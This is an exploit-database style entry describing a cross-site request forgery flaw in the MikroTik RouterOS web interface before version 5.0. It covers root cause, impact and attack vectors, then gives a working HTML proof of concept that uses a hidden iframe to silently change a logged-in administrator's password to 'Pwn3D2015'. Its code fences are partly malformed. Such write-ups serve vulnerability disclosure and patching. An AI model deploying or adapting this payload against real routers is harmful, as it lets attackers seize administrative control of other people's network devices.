```
# Exploit Title: MikroTik RouterOS Admin Password Change CSRF
# Date: 23-2-2015
# Exploit Author: Mohamed Abdelbaset Elnoby (@SymbianSyMoh)
# Vendor Homepage: <http://www.mikrotik.com>
# Software Link: <http://www.mikrotik.com/download>
# Version: All versions < 5.0
# Tested on: All OS
# CVE : N/A

# Vulnerability Details:
- **Root cause:** The MikroTik RouterOS web interface does not implement sufficient protection against Cross-Site Request Forgery (CSRF) attacks. Specifically, there is no CSRF token verification when changing the admin password.
- **Weaknesses/vulnerabilities:** CSRF vulnerability.
- **Impact of exploitation:** An attacker can force an authenticated user to change their admin password without their consent, potentially gaining administrative access to the RouterOS device.
- **Attack vectors:** The attacker needs to trick a logged-in user to visit a crafted web page or to click a malicious link. The malicious page contains HTML code that sends an HTTP request to the router to change the password.
- **Required attacker capabilities/position:** The attacker needs to have a way to get a logged-in administrator to unknowingly load a webpage they control. This can be done through social engineering techniques such as sending a link via email/chat. The victim must also be logged in to the MikroTik router web interface.

**Technical Details from Proof-of-Concept Code:**

The provided Proof of Concept (PoC) code shows an HTML page that, when loaded by a logged-in administrator, changes the router admin password to "Pwn3D2015":
```html
<html>
<body>
<title>MikroTik RouterOS < v4 Admin Password Change CSRF
Vulnerability</title>
<h1><b>MikroTik RouterOS < v4 Admin Password Change CSRF Vulnerability by
@SymbianSyMoh</b></h1></br>
<input type="submit" value="Do it" onclick="var
btn=document.createElement('IFRAME');btn.src='
<http://192.168.0.2/cfg?page=status&counter=1000&process=password&password1=Pwn3D2015&password2=Pwn3D2015&button=ok';btn.width='0';btn.height='0';btn.id='myIframe';document.body.appendChild>(btn);alert('Pwned')
;"></br>
</body>
</html>
```
This code uses an iframe to silently send the password change request to the router.
```
This exploit works on all versions prior to v5.0
```
```
The vulnerability has not been assigned a CVE identifier.
```